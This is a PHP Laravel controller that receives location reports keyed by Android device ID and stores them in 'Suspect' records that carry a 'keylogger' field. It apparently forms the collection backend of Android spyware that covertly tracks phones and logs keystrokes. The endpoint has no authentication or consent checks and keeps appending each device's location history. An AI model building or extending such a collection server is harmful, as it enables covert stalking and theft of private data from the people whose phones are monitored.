<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Suspect;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class LocationController extends Controller
{
    public function post(Request $request){
        $data = $request->all();

        $suspect = Suspect::where('android_id', $data['androidId'])->first();

        if ($suspect){
            if ($suspect->location) {
                $suspect->location .= "\n" . $data['location'];
            } else {
                $suspect->location = $data['location'];
            }
            $suspect->save();
        } else {
            $suspect = Suspect::create([
                'android_id' => $data['androidId'],
                'name' => $data['name'],
                'location' => $data['location'],
                'keylogger' => ''
            ]);
        }

        return response()->json(['success' => true]);
    }
}
